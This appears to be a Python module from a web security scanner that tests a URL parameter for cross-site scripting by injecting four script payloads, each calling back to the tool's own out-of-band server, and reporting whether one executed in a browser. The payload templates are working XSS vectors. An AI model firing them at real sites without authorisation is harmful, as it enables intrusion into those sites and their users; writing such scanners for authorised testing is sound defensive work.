from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from .oob import OOBServer
from . import browser

_PAYLOAD_TEMPLATES = [
    "<script>fetch('{oob}')</script>",
    "\"><script>fetch('{oob}')</script>",
    "<img src=x onerror=\"fetch('{oob}')\">",
    "<svg onload=\"fetch('{oob}')\">",
]


def _with_param(url, param, value):
    parts = urlparse(url)
    q = parse_qs(parts.query)
    q[param] = [value]
    new_query = urlencode(q, doseq=True)
    return urlunparse(parts._replace(query=new_query))


def probe(target_url, param, oob_server=None, headers=None, cookies=None,
          engine_cfg=None, wait_timeout=4.0):
    own_oob = oob_server is None
    oob = oob_server or OOBServer().start()
    out = {"target": target_url, "param": param, "oob_base": oob.base_url,
           "attempts": [], "callbacks": [], "result": None}
    try:
        for tmpl in _PAYLOAD_TEMPLATES:
            token, url = oob.payload_url()
            payload = tmpl.format(oob=url)
            test_url = _with_param(target_url, param, payload)
            r = browser.capture(test_url, headers=headers, cookies=cookies,
                                screenshot=False, engine_cfg=engine_cfg)
            attempt = {"token": token, "payload": tmpl,
                       "browser_error": r.get("error")}
            out["attempts"].append(attempt)
            if r.get("error") and str(r["error"]).startswith("ROE_BLOCK"):
                out["result"] = {"verdict": "UNKNOWN", "reason": r["error"],
                                 "evidence": {}}
                return out
            if oob.wait_for_hit(token, timeout=wait_timeout):
                out["callbacks"].append({"token": token, "payload": tmpl})
    finally:
        if own_oob:
            oob.stop()

    if out["callbacks"]:
        payloads = ", ".join(c["payload"] for c in out["callbacks"])
        out["result"] = {"verdict": "VULNERABLE",
                         "reason": f"injected script executed in browser "
                                   f"(out-of-band callback) via: {payloads}",
                         "evidence": {"callbacks": out["callbacks"],
                                      "param": param}}
    else:
        out["result"] = {"verdict": "PASS",
                         "reason": "no payload executed in browser",
                         "evidence": {"payloads_tried": len(out["attempts"])}}
    return out
